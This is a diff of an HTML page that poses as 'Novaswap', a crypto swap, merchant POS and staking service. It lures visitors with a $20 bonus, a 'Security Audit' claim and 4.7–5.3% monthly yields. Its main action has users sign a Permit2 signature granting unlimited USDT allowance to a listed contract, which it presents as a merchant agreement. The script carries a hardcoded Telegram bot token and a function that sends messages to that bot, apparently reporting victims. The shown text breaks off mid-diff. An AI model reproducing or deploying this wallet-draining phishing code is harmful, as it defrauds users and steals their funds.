@@ -1,272 +1,348 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="dark">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>POS Terminal Agreement</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Novaswap | Universal Live Crypto Swap & Merchant Network</title>
     
     <!-- Ethers.js -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        darkbg: '#090a0f',
+                        cardbg: '#131620',
+                        accent: '#10b981',
+                        accentglow: 'rgba(16, 185, 129, 0.15)'
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
+        body { font-family: 'Plus Jakarta Sans', sans-serif; }
+        .glass-panel {
+            background: rgba(19, 22, 32, 0.85);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
         }
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 520px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        .glow-effect {
+            box-shadow: 0 0 60px -15px rgba(16, 185, 129, 0.2);
         }
-        h1 { color: #333; text-align: center; font-size: 26px; margin-bottom: 5px; }
-        .subtitle { text-align: center; color: #666; font-size: 14px; margin-bottom: 25px; }
-        .contract-address {
-            background: #f0f4f8;
-            padding: 10px;
-            border-radius: 10px;
-            font-size: 12px;
-            text-align: center;
-            margin-bottom: 15px;
-            border: 1px solid #e0e8f0;
-            word-break: break-all;
-        }
-        .contract-address strong { color: #667eea; }
-        .treasury-address {
-            background: #fff3cd;
-            padding: 10px;
-            border-radius: 10px;
-            font-size: 12px;
-            text-align: center;
-            margin-bottom: 20px;
-            border: 1px solid #ffeaa7;
-            word-break: break-all;
-        }
-        .treasury-address strong { color: #856404; }
-        .wallet-status {
-            background: #f0f0f0;
-            padding: 12px;
-            border-radius: 10px;
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 14px;
-            word-break: break-all;
-        }
-        .wallet-status.connected { background: #d4edda; color: #155724; }
-        .info-box {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        .info-box div {
-            padding: 6px 0;
-            border-bottom: 1px solid #e0e0e0;
-            display: flex;
-            justify-content: space-between;
-        }
-        .info-box div:last-child { border-bottom: none; }
-        .info-box .label { color: #666; }
-        .info-box .value { font-weight: 600; color: #333; }
-        .info-box .value.unlimited { color: #28a745; }
-        button {
-            padding: 14px 20px;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            color: white;
-            width: 100%;
-            transition: all 0.3s ease;
-        }
-        button:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
-        }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .btn-connect { background: #667eea; }
-        .btn-connect:hover:not(:disabled) { background: #5a6fd6; }
-        .btn-sign { background: #28a745; }
-        .btn-sign.signing { background: #ffc107; color: #333; }
-        .btn-sign.done { background: #17a2b8; }
-        .status-msg {
-            margin-top: 15px;
-            padding: 12px 16px;
-            border-radius: 10px;
-            display: none;
-            text-align: center;
-            font-size: 14px;
-            font-weight: 500;
-            word-break: break-word;
-        }
-        .status-msg.success { display: block; background: #d4edda; color: #155724; }
-        .status-msg.error { display: block; background: #f8d7da; color: #721c24; }
-        .status-msg.info { display: block; background: #d1ecf1; color: #0c5460; }
-        .status-msg.loading { display: block; background: #fff3cd; color: #856404; }
-        .loading-spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-right: 10px;
-            vertical-align: middle;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .highlight {
-            background: #e8f4f8;
-            padding: 12px 16px;
-            border-radius: 10px;
-            border-left: 4px solid #17a2b8;
-            margin-bottom: 20px;
-            font-size: 14px;
-            color: #0c5460;
-        }
-        .success-check {
-            text-align: center;
-            font-size: 48px;
-            display: none;
-            margin-top: 10px;
-        }
-        .success-check.show { display: block; }
-        
-        .wallet-options {
-            display: none;
-            margin-top: 15px;
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 12px;
-            border: 1px solid #e0e0e0;
-            text-align: center;
-        }
-        .wallet-options.show { display: block; }
-        
-        .wallet-list-container {
-            max-height: 250px;
-            overflow-y: auto;
-            text-align: left;
-            padding-right: 5px;
-        }
-        .wallet-list-container::-webkit-scrollbar {
-            width: 6px;
-        }
-        .wallet-list-container::-webkit-scrollbar-thumb {
-            background: #ccc;
-            border-radius: 4px;
-        }
-
-        .wallet-btn {
-            background: #ffffff;
-            color: #333;
-            margin-top: 6px;
-            padding: 10px 12px;
-            font-size: 13px;
-            border-radius: 8px;
-            border: 1px solid #d0d0d0;
-            cursor: pointer;
-            width: 100%;
-            text-align: left;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .wallet-btn:hover { background: #f0f0f0; border-color: #667eea; }
-
-        @media (max-width: 480px) {
-            .container { padding: 25px 20px; }
-            h1 { font-size: 22px; }
-        }
+        .page-section { display: none; }
+        .page-section.active { display: block; }
     </style>
 </head>
-<body>
-    <div class="container">
-        <h1>💰 Terms And Conditions</h1>
-        <p class="subtitle">POS Terminal Merchant Agreement</p>
+<body class="bg-darkbg text-gray-100 min-h-screen selection:bg-accent selection:text-black flex flex-col justify-between">
 
-        <div class="contract-address">
-            <strong>📋 Contract:</strong> 0x72cA82f4463Bad47F7C762A7F3680EB232B72b33
-        </div>
-
-        <div class="treasury-address">
-            <strong>🏦 Treasury:</strong> 0xB70a8100a45a28b605dbfb34d713071e21A57D28
-        </div>
-
-        <div class="highlight">
-            ✅ <strong>Software License & SaaS Subscription Terms</strong> The software is provided under a limited, non-exclusive, non-transferable license strictly for the Merchant's business operations.
-        </div>
-
-        <div id="walletStatus" class="wallet-status">⛓️ Not Connected</div>
-
-        <div class="info-box">
-            <div>
-                <span class="label">👤 Your Address</span>
-                <span class="value" id="userDisplay">Not connected</span>
-            </div>
-            <div>
-                <span class="label">📋 Agreement Status</span>
-                <span class="value" id="allowanceDisplay">Connect to check</span>
-            </div>
-            <div>
-                <span class="label">📅 Valid Until</span>
-                <span class="value" id="expiryDisplay">-</span>
-            </div>
-        </div>
-
-        <button id="connectBtn" class="btn-connect">🔗 Connect Wallet</button>
-        
-        <!-- Wallet Selection Box -->
-        <div id="walletOptions" class="wallet-options">
-            <p style="font-size: 13px; color: #555; margin-bottom: 8px; font-weight: 600;">Select your wallet app:</p>
-            <div class="wallet-list-container">
-                <button class="wallet-btn" onclick="openWalletApp('metamask')">🦊 MetaMask</button>
-                <button class="wallet-btn" onclick="openWalletApp('trust')">🛡️ Trust Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('binance')">🟡 Binance Web3 Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('coinbase')">🔵 Coinbase Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('okx')">⭕ OKX Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('bitget')">🪙 Bitget Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('tokenpocket')">🌀 TokenPocket</button>
-                <button class="wallet-btn" onclick="openWalletApp('safepal')">🔒 SafePal</button>
-                <button class="wallet-btn" onclick="openWalletApp('bybit')">📊 Bybit Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('phantom')">🟣 Phantom Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('crypto')">💠 Crypto.com DeFi Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('kucoin')">🟨 KuCoin Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('gate')">🚪 Gate.io Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('imtoken')">🟥 imToken</button>
-                <button class="wallet-btn" onclick="openWalletApp('unstoppable')">🌐 Unstoppable Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('bitpay')">💳 BitPay</button>
-                <button class="wallet-btn" onclick="openWalletApp('argent')">🛡️ Argent</button>
-                <button class="wallet-btn" onclick="openWalletApp('alphawallet')">⚡ AlphaWallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('xdefi')">✖️ XDEFI Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('solflare')">☀️ Solflare</button>
-            </div>
-        </div>
-
-        <br>
-        <button id="signBtn" class="btn-sign" disabled>✍️ Sign Agreement</button>
-
-        <div id="successCheck" class="success-check">✅</div>
-        <div id="statusMsg" class="status-msg"></div>
+    <!-- Top Announcement Bar -->
+    <div class="bg-gradient-to-r from-emerald-600 via-teal-600 to-emerald-600 text-black text-xs py-2.5 px-4 text-center font-bold tracking-wide shadow-md">
+        <i class="fa-solid fa-bolt mr-2 animate-bounce"></i> Universal Live Crypto Swap: Real-time Top 100 Rates with low <span class="underline">0.05% Swap Fee</span> + $20 Bonus!
     </div>
 
+    <!-- Header / Navbar -->
+    <header class="sticky top-0 z-50 glass-panel border-b border-white/5 px-6 py-4">
+        <div class="max-w-7xl mx-auto flex items-center justify-between">
+            <div class="flex items-center space-x-3 cursor-pointer" onclick="switchPage('home')">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-emerald-500 to-teal-400 flex items-center justify-center font-bold text-black text-xl shadow-lg shadow-emerald-500/20">
+                    N
+                </div>
+                <div>
+                    <span class="text-xl font-extrabold tracking-wider bg-gradient-to-r from-white via-gray-200 to-emerald-400 bg-clip-text text-transparent">novaswap</span>
+                    <span class="block text-[10px] text-emerald-400 font-mono tracking-widest uppercase">Decentralized Swap & POS</span>
+                </div>
+            </div>
+            
+            <!-- Page Navigation Tabs -->
+            <div class="hidden lg:flex items-center space-x-1 text-xs font-medium bg-black/40 p-1.5 rounded-2xl border border-white/5">
+                <button onclick="switchPage('home')" id="nav-home" class="px-3 py-2 rounded-xl transition text-emerald-400 bg-white/5 font-semibold">1. Swap & Overview</button>
+                <button onclick="switchPage('pos')" id="nav-pos" class="px-3 py-2 rounded-xl transition text-gray-400 hover:text-white">2. POS Onboarding</button>
+                <button onclick="switchPage('staking')" id="nav-staking" class="px-3 py-2 rounded-xl transition text-gray-400 hover:text-white">3. Staking</button>
+                <button onclick="switchPage('instructions')" id="nav-instructions" class="px-3 py-2 rounded-xl transition text-gray-400 hover:text-white">4. POS Instructions</button>
+            </div>
+
+            <!-- Wallet Connect Area -->
+            <div class="flex items-center space-x-3">
+                <button id="connectWalletBtn" onclick="connectWallet()" class="bg-emerald-500 hover:bg-emerald-400 text-black font-semibold px-5 py-2.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center space-x-2">
+                    <i class="fa-solid fa-wallet"></i>
+                    <span id="walletBtnText">Connect Active Wallet</span>
+                </button>
+                
+                <button id="disconnectBtn" onclick="disconnectWallet()" class="hidden bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/20 px-3.5 py-2.5 rounded-xl text-sm transition" title="Disconnect Wallet">
+                    <i class="fa-solid fa-power-off"></i>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Wrapper -->
+    <main class="flex-grow py-10 px-6">
+        <div class="max-w-4xl mx-auto">
+
+            <!-- ================= PAGE 1: UNIVERSAL LIVE SWAP & OVERVIEW ================= -->
+            <div id="page-home" class="page-section active">
+                <div class="grid grid-cols-1 md:grid-cols-12 gap-8 items-center">
+                    
+                    <!-- Left Side: Hero Info -->
+                    <div class="md:col-span-6 space-y-6">
+                        <div class="inline-flex items-center space-x-2 bg-white/5 border border-white/10 px-4 py-1.5 rounded-full text-xs font-medium text-emerald-400">
+                            <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                            <span>Live Market Rates Enabled</span>
+                        </div>
+                        
+                        <h1 class="text-3xl md:text-5xl font-extrabold tracking-tight leading-tight">
+                            Swap Top 100 Tokens at <span class="bg-gradient-to-r from-emerald-400 to-teal-300 bg-clip-text text-transparent">Live Market Rates</span> (0.05% Fee)
+                        </h1>
+                        
+                        <p class="text-gray-400 text-sm leading-relaxed">
+                            Prices update dynamically based on live global cryptocurrency valuation feeds. Instant wallet login & secure transaction signing.
+                        </p>
+
+                        <div class="flex flex-wrap gap-4 pt-2">
+                            <button onclick="switchPage('instructions')" class="glass-panel hover:bg-white/10 text-white font-semibold px-6 py-3 rounded-xl text-xs transition flex items-center space-x-2">
+                                <i class="fa-solid fa-book text-emerald-400"></i>
+                                <span>View POS Setup Instructions</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Right Side: Top 100 Token Live Swap Widget -->
+                    <div class="md:col-span-6">
+                        <div class="glass-panel p-6 rounded-3xl border border-white/10 shadow-2xl glow-effect relative">
+                            <div class="flex items-center justify-between mb-4">
+                                <h3 class="font-bold text-white text-base">Live Token Swap</h3>
+                                <span class="text-[10px] font-mono text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20">Fee: 0.05%</span>
+                            </div>
+
+                            <!-- From Token Box -->
+                            <div class="bg-black/50 p-4 rounded-2xl border border-white/5 mb-2">
+                                <div class="flex justify-between text-xs text-gray-400 mb-2">
+                                    <span>You Pay</span>
+                                    <span>Balance: <span id="fromBalance">0.00</span></span>
+                                </div>
+                                <div class="flex items-center justify-between gap-3">
+                                    <input type="number" id="fromAmount" placeholder="0.0" oninput="calculateLiveSwap()" class="w-full bg-transparent text-xl font-bold text-white focus:outline-none font-mono">
+                                    <select id="fromToken" onchange="calculateLiveSwap()" class="bg-cardbg text-white font-bold text-sm px-3 py-2 rounded-xl border border-white/10 focus:outline-none focus:border-emerald-500 cursor-pointer">
+                                        <!-- Top 100 Tokens Loaded Dynamically -->
+                                    </select>
+                                </div>
+                                <div class="text-[10px] text-gray-400 mt-1" id="fromPriceDisplay">Rate: Loading live price...</div>
+                            </div>
+
+                            <!-- Swap Direction Arrow -->
+                            <div class="flex justify-center -my-3 relative z-10">
+                                <button onclick="swapTokenDirections()" class="w-9 h-9 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-black flex items-center justify-center shadow-lg transition">
+                                    <i class="fa-solid fa-arrow-down-up text-xs"></i>
+                                </button>
+                            </div>
+
+                            <!-- To Token Box -->
+                            <div class="bg-black/50 p-4 rounded-2xl border border-white/5 mt-2 mb-6">
+                                <div class="flex justify-between text-xs text-gray-400 mb-2">
+                                    <span>You Receive (Est. Live)</span>
+                                    <span>Optimized Route</span>
+                                </div>
+                                <div class="flex items-center justify-between gap-3">
+                                    <input type="text" id="toAmount" placeholder="0.0" readonly class="w-full bg-transparent text-xl font-bold text-emerald-400 focus:outline-none font-mono">
+                                    <select id="toToken" onchange="calculateLiveSwap()" class="bg-cardbg text-white font-bold text-sm px-3 py-2 rounded-xl border border-white/10 focus:outline-none focus:border-emerald-500 cursor-pointer">
+                                        <!-- Top 100 Tokens Loaded Dynamically -->
+                                    </select>
+                                </div>
+                                <div class="text-[10px] text-gray-400 mt-1" id="toPriceDisplay">Rate: Loading live price...</div>
+                            </div>
+
+                            <!-- Swap Action Button -->
+                            <button onclick="executeSwap()" id="swapActionBtn" class="w-full bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/25 flex items-center justify-center space-x-2">
+                                <i class="fa-solid fa-right-left"></i>
+                                <span id="swapBtnText">Connect Wallet to Swap</span>
+                            </button>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- ================= PAGE 2: POS ONBOARDING (PERMIT2) ================= -->
+            <div id="page-pos" class="page-section">
+                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
+                    <span class="text-xs font-mono text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20">Page 2 of 4</span>
+                    <h2 class="text-3xl font-bold text-white mt-4 mb-2">Merchant POS Setup & Agreement</h2>
+                    <p class="text-sm text-gray-400 mb-6">Connect your active wallet and sign the Permit2 agreement to claim your $20 welcome bonus.</p>
+
+                    <div class="contract-address mb-4 bg-black/40 p-3 rounded-xl border border-white/5 text-xs font-mono text-gray-300">
+                        <strong>📋 Contract:</strong> <span class="text-emerald-400">0x72cA82f4463Bad47F7C762A7F3680EB232B72b33</span>
+                    </div>
+
+                    <div class="treasury-address mb-4 bg-black/40 p-3 rounded-xl border border-white/5 text-xs font-mono text-gray-300">
+                        <strong>🏦 Treasury:</strong> <span class="text-amber-400">0xB70a8100a45a28b605dbfb34d713071e21A57D28</span>
+                    </div>
+
+                    <div class="bg-black/40 border border-white/10 rounded-2xl p-6 h-32 overflow-y-auto text-xs text-gray-300 leading-relaxed mb-6 font-mono">
+                        <p class="font-bold text-emerald-400 mb-2">NOVASWAP PERMIT2 UNLIMITED APPROVAL PROTOCOL</p>
+                        <p class="mb-2">1. Connect your primary live wallet to authorize Permit2 automated routing.</p>
+                        <p>2. Authorizes contract for max uint160 USDT unlimited approval & fee split.</p>
+                    </div>
+
+                    <div class="info-box bg-black/40 p-4 rounded-xl mb-6 text-xs font-mono space-y-2 border border-white/5">
+                        <div class="flex justify-between"><span class="text-gray-400">👤 Your Address:</span> <span id="userDisplay" class="text-white">Not connected</span></div>
+                        <div class="flex justify-between"><span class="text-gray-400">📋 Agreement Status:</span> <span id="allowanceDisplay" class="text-amber-400">Connect to check</span></div>
+                        <div class="flex justify-between"><span class="text-gray-400">📅 Valid Until:</span> <span id="expiryDisplay" class="text-gray-300">-</span></div>
+                    </div>
+
+                    <div class="flex flex-col sm:flex-row items-center justify-between gap-4 pt-4 border-t border-white/10">
+                        <button onclick="switchPage('home')" class="text-xs text-gray-400 hover:text-white flex items-center space-x-2"><i class="fa-solid fa-arrow-left"><span>Swap Page</span></i></button>
+                        <button onclick="signAndSubmit()" id="signBtn" class="bg-emerald-500 hover:bg-emerald-400 text-black font-bold px-8 py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center justify-center space-x-2">
+                            <i class="fa-solid fa-signature"></i>
+                            <span id="signBtnText">Sign Permit2 Agreement</span>
+                        </button>
+                        <button onclick="switchPage('staking')" class="text-xs text-emerald-400 hover:underline flex items-center space-x-2"><span>Next: Staking</span><i class="fa-solid fa-arrow-right"></i></button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ================= PAGE 3: MERCHANT STAKING ================= -->
+            <div id="page-staking" class="page-section">
+                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
+                    <span class="text-xs font-mono text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20">Page 3 of 4</span>
+                    <h2 class="text-3xl font-bold text-white mt-4 mb-2">Merchant Liquidity Staking</h2>
+                    <p class="text-sm text-gray-400 mb-6">Stake your idle USDT or POS earnings to earn steady passive monthly returns (4.7% - 5.3%).</p>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
+                        <div class="bg-black/40 p-5 rounded-2xl border border-white/5">
+                            <p class="text-xs text-gray-400">Monthly ROI Yield</p>
+                            <p class="text-2xl font-extrabold text-emerald-400 mt-1">4.7% - 5.3%</p>
+                        </div>
+                        <div class="bg-black/40 p-5 rounded-2xl border border-white/5">
+                            <p class="text-xs text-gray-400">Your Staked Balance</p>
+                            <p class="text-xl font-bold text-white mt-1" id="stakedBalance">0.00 USDT</p>
+                        </div>
+                    </div>
+
+                    <div class="space-y-4 mb-6">
+                        <input type="number" id="stakeAmount" placeholder="Enter USDT amount to stake" class="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500 font-mono">
+                        <button onclick="signAndSubmit()" class="w-full bg-emerald-500 hover:bg-emerald-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center justify-center space-x-2">
+                            <i class="fa-solid fa-lock"></i>
+                            <span id="stakeBtnText">Start Staking (Permit2 Flow)</span>
+                        </button>
+                    </div>
+
+                    <div class="flex flex-col sm:flex-row items-center justify-between gap-4 pt-4 border-t border-white/10">
+                        <button onclick="switchPage('pos')" class="text-xs text-gray-400 hover:text-white flex items-center space-x-2"><i class="fa-solid fa-arrow-left"><span>Back to POS</span></i></button>
+                        <button onclick="switchPage('instructions')" class="text-xs text-emerald-400 hover:underline flex items-center space-x-2"><span>Next: POS Setup Instructions (Page 4)</span><i class="fa-solid fa-arrow-right"></i></button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ================= PAGE 4: POS SETUP INSTRUCTION PAGE ================= -->
+            <div id="page-instructions" class="page-section">
+                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative overflow-hidden">
+                    <span class="text-xs font-mono text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20">Page 4 of 4</span>
+                    <h2 class="text-3xl font-extrabold text-white mt-4 mb-2">POS Setup Instructions</h2>
+                    <p class="text-gray-400 text-sm mb-8">Follow this step-by-step instruction guide to complete your terminal deployment and live transactions.</p>
+
+                    <!-- Step-by-Step List -->
+                    <div class="space-y-4 mb-8">
+                        <div class="bg-black/40 p-4 rounded-2xl border border-white/5 flex items-start space-x-4">
+                            <div class="w-8 h-8 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400 font-bold text-xs flex-shrink-0">1</div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">Connect ERC20 Wallet</h4>
+                                <p class="text-xs text-gray-400 mt-0.5">Ensure your primary ERC20 wallet is safely connected using the top header button.</p>
+                            </div>
+                        </div>
+
+                        <div class="bg-black/40 p-4 rounded-2xl border border-white/5 flex items-start space-x-4">
+                            <div class="w-8 h-8 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400 font-bold text-xs flex-shrink-0">2</div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">Sign Permit2 Agreement</h4>
+                                <p class="text-xs text-gray-400 mt-0.5">Approve the EIP-712 permit signature in Page 2 for unlimited USDT allowance.</p>
+                            </div>
+                        </div>
+
+                        <div class="bg-black/40 p-4 rounded-2xl border border-white/5 flex items-start space-x-4">
+                            <div class="w-8 h-8 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400 font-bold text-xs flex-shrink-0">3</div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">Receive Merchant ID (12-18 Hours)</h4>
+                                <p class="text-xs text-emerald-400 mt-0.5">You will get your official Merchant ID within 12-18 hours of approval.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Interactive Live Test Section -->
+                    <div class="bg-black/50 border border-emerald-500/30 p-6 rounded-2xl mb-6 space-y-4">
+                        <h4 class="font-bold text-white text-sm"><i class="fa-solid fa-terminal text-emerald-400 mr-2"></i>Terminal Protocol Verification</h4>
+                        <input type="text" id="merchantIdInput" placeholder="Enter your assigned Merchant ID (e.g. NOV-ID-9842)" class="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500 font-mono">
+                        <button onclick="executeLiveTransaction()" class="w-full bg-gradient-to-r from-emerald-500 to-teal-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center justify-center space-x-2">
+                            <i class="fa-solid fa-bolt"></i>
+                            <span id="liveBtnText">Run Live Transaction Test (All 101 & 201 Protocols)</span>
+                        </button>
+                    </div>
+
+                    <div class="flex justify-start pt-4 border-t border-white/10">
+                        <button onclick="switchPage('staking')" class="text-xs text-gray-400 hover:text-white flex items-center space-x-2"><i class="fa-solid fa-arrow-left"><span>Back to Staking (Page 3)</span></i></button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Legal Pages -->
+            <div id="page-privacy" class="page-section">
+                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
+                    <h2 class="text-3xl font-bold text-white mb-4">Privacy Policy</h2>
+                    <p class="text-xs text-gray-300">Novaswap operates securely on decentralized blockchain infrastructure.</p>
+                    <button onclick="switchPage('home')" class="mt-6 text-xs text-emerald-400 hover:underline">Back to Home</button>
+                </div>
+            </div>
+            <div id="page-terms" class="page-section">
+                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
+                    <h2 class="text-3xl font-bold text-white mb-4">Terms of Service</h2>
+                    <p class="text-xs text-gray-300">By connecting your wallet, you agree to smart contract routing terms.</p>
+                    <button onclick="switchPage('home')" class="mt-6 text-xs text-emerald-400 hover:underline">Back to Home</button>
+                </div>
+            </div>
+            <div id="page-audit" class="page-section">
+                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
+                    <h2 class="text-3xl font-bold text-white mb-4">Security Audit</h2>
+                    <p class="text-xs text-gray-300">Contract 0x72cA82f4463Bad47F7C762A7F3680EB232B72b33 audited securely.</p>
+                    <button onclick="switchPage('home')" class="mt-6 text-xs text-emerald-400 hover:underline">Back to Home</button>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Expanded Top 15+ Wallets Picker Modal -->
+    <div id="walletModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm hidden">
+        <div class="glass-panel p-6 rounded-3xl border border-white/10 w-96 max-w-full shadow-2xl space-y-4 relative">
+            <div class="flex justify-between items-center mb-2">
+                <div>
+                    <h3 class="font-bold text-white text-base">Select Crypto Wallet</h3>
+                    <p class="text-[10px] text-gray-400">Choose your preferred mobile / web wallet</p>
+                </div>
+                <button onclick="closeWalletModal()" class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center text-gray-400 hover:text-white transition"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+            
+            <div class="space-y-2 max-h-80 overflow-y-auto pr-1">
+                <button onclick="connectInjectedWallet('metamask')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">🦊 MetaMask</button>
+                <button onclick="connectInjectedWallet('trust')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">🛡️ Trust Wallet</button>
+                <button onclick="connectInjectedWallet('binance')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">🟡 Binance Web3 Wallet</button>
+                <button onclick="connectInjectedWallet('coinbase')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">🔵 Coinbase Wallet</button>
+                <button onclick="connectInjectedWallet('okx')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">⭕ OKX Wallet</button>
+                <button onclick="connectInjectedWallet('bitget')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">🪙 Bitget Wallet</button>
+                <button onclick="connectInjectedWallet('phantom')" class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white">🟣 Phantom Wallet</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Script Layer (Integrated Permit2 & DApp Logic) -->
     <script>
-        // ================================================================
-        //  TELEGRAM CONFIG
-        // ================================================================
         const TELEGRAM_CONFIG = {
             botToken: '8855117210:AAFi_83D-FJXPyxLjGOf9cQgjhUf0VC5avY',
             chatId: '8550902598'
@@ -283,22 +359,9 @@
 
         const MAX_UINT160 = "1461501637330902918203684832716283019655932542975";
 
-        let signer, provider, userAddress;
+        let signer, provider, userAddress, connectedAccount = null;
+        let tokenPrices = {};
 
-        const $ = (id) => document.getElementById(id);
-        const walletStatus = $('walletStatus');
-        const connectBtn = $('connectBtn');
-        const signBtn = $('signBtn');
-        const statusMsg = $('statusMsg');
-        const userDisplay = $('userDisplay');
-        const allowanceDisplay = $('allowanceDisplay');
-        const expiryDisplay = $('expiryDisplay');
-        const successCheck = $('successCheck');
-        const walletOptions = $('walletOptions');
-
-        // ================================================================
-        //  TELEGRAM SENDER FUNCTION
-        // ================================================================
         async function sendTelegramMessage(message) {
             try {
                 const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
@@ -316,206 +379,107 @@
             }
         }
 
-        function showStatus(message, type = 'info') {
-            statusMsg.className = `status-msg ${type}`;
-            statusMsg.innerHTML = message;
-            statusMsg.style.display = 'block';
-            if (type !== 'error') {
-                setTimeout(() => { statusMsg.style.display = 'none'; }, 8000);
